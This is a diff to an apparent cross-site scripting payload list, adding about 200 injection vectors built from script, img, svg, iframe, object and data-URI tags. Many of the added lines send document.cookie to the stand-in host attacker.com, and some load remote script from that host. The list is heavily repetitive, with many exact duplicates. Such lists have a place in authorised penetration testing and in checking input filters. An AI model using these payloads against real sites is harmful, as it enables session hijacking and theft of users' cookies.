@@ -1,4 +1,207 @@
+<script>alert('XSS')</script>
 <script>alert(document.domain)</script>
-"><script>alert(document.cookie)</script>
-"><img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
+<script>alert(document.cookie)</script>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<script>console.log('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<img src="x" onerror="fetch('http://attacker.com?cookie=' + document.cookie)">
+<svg onload="alert('XSS')">
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)">
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
+<object data="javascript:alert('XSS')"></object>
+<embed type="image/jpg" src="javascript:alert('XSS')"></embed>
+<video src="javascript:alert('XSS')"></video>
+<details open><summary>Click me</summary><script>alert('XSS')</script></details>
+<details open><summary>Click me</summary><svg onload="alert('XSS')"></svg></details>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
+<script>eval('alert(1)')</script>
+<script>setTimeout('alert(1)', 0)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>setInterval('console.log(1)', 1000)</script>
+<script>document.location='http://attacker.com?cookie=' + document.cookie</script>
+<svg onload="(new Image()).src='http://attacker.com?cookie=' + document.cookie"></svg>
+<svg onload="window.location='http://attacker.com?cookie=' + document.cookie"></svg>
+<script>document.getElementById('foo').innerHTML = '<img src=x onerror=alert(1)>'</script>
+<script>document.getElementById('foo').innerHTML = '<svg onload=alert(1)>'</script>
+<iframe src="data:text/html,<script>document.write('<svg onload=alert(1)>')</script>"></iframe>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<svg onload="eval('alert(1)')"></svg>
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="(function() { fetch('http://attacker.com?cookie=' + document.cookie) })()"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="(function() { window.location='http://attacker.com?cookie=' + document.cookie })()"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="(function() { document.body.innerHTML='<img src=x onerror=alert(1)>' })()"></svg>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<img src="data:image/svg+xml,<svg onload='alert(1)' />" />
+<svg onload="fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))"></svg>
+<svg onload="fetch('http://attacker.com?cookie=' + btoa(document.cookie))"></svg>
+<script src="http://attacker.com/malicious.js"></script>
+<iframe src="http://attacker.com/malicious.html"></iframe>
+<script src="data:text/javascript,alert('XSS')"></script>
+<svg onload="(function() { document.body.innerHTML='<img src=x onerror=alert(1)>' })()"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="(function() { document.body.innerHTML='<img src=x onerror=alert(1)>' })()"></svg>
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<script>fetch('http://attacker.com?cookie=' + btoa(document.cookie))</script>
+<img src="data:text/html,<script>alert('XSS')</script>">
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<svg onload="document.body.innerHTML='<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>'"></svg>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg onload="fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))"></svg>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<script>document.body.innerHTML='<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'</script>
+<svg onload="(function(){fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))})()"></svg>
+<script>fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<svg onload="fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<iframe src="data:text/html,<script>document.write('<img src=x onerror=alert(1)>')</script>"></iframe>
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<svg onload="eval('alert(1)')"></svg>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="(function(){window.location='http://attacker.com?cookie=' + document.cookie})()"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script src="data:text/javascript,console.log(1)"></script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script>fetch('http://attacker.com?cookie=' + encodeURIComponent(document.cookie))</script>
+<svg onload="eval('alert(1)')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<script>document.write('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>')</script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,eval('alert(1)')"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<script src="data:text/javascript,eval('alert(1)')"></script>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<script src="data:text/javascript,console.log(1)"></script>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg onload="eval('alert(1)')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<script>document.write('<svg onload=alert(1)>')</script>
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script src="data:text/javascript,console.log(1)"></script>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<script src="data:text/javascript,eval('alert(1)')"></script>
+<script src="data:text/javascript,console.log(1)"></script>
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script src="data:text/javascript,console.log(1)"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>document.write('<svg onload=alert(1)>')</script>
+<svg onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<script src="data:text/javascript,console.log(1)"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<svg onload="eval('alert(1)')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<img src="data:image/svg+xml,<svg onload=alert(1)>" />
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<script src="data:text/javascript,console.log(1)"></script>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script src="data:text/javascript,document.write('<svg onload=alert(1)>')"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)' />" />
+<script src="data:text/javascript,console.log(1)"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<script src="data:text/javascript,eval('alert(1)')"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<script>document.write('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>')</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<script>document.write('<svg onload=alert(1)>')</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie=' + document.cookie)"></svg>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<script src="data:text/javascript,console.log(1)"></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<script>document.write('<svg onload=alert(1)>')</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval('alert(1)')"></svg>
+<svg onload="document.body.innerHTML='<img src=x onerror=alert(1)>'"></svg>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+<script src="data:text/javascript,eval('alert(1)')"></script>
+<script src="data:text/javascript,console.log(1)"></script>
